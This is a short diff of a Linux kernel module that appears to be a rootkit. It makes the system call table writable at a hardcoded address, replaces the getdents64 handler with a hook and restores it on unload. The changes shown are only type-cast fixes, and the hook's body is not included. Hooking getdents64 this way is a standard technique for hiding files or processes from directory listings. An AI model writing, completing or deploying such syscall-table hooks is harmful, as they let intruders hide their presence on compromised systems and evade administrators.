@@ -50,7 +50,7 @@ next: next    dirp
   return nob;
 }
 
-int set_page_rw(uintptr_t addr, int f) {
+int set_page_rw(unsigned long addr, int f) {
   unsigned int level;
   pte_t *pte = lookup_address(addr, &level);
 
@@ -67,7 +67,7 @@ int set_page_rw(uintptr_t addr, int f) {
 int f_init(void) {
   sys_call_table = (void*)0xffffffff820013a0;
 
-  set_page_rw(sys_call_table, 1);
+  set_page_rw((uintptr_t)sys_call_table, 1);
   getdents64_original = sys_call_table[__NR_getdents64];
   sys_call_table[__NR_getdents64] = getdents64_hook;
 
@@ -76,7 +76,7 @@ int f_init(void) {
 
 void f_exit(void) {
   sys_call_table[__NR_getdents64] = getdents64_original;
-  set_page_rw(sys_call_table, 0);
+  set_page_rw((uintptr_t)sys_call_table, 0);
 }
 
 MODULE_LICENSE("GPL");
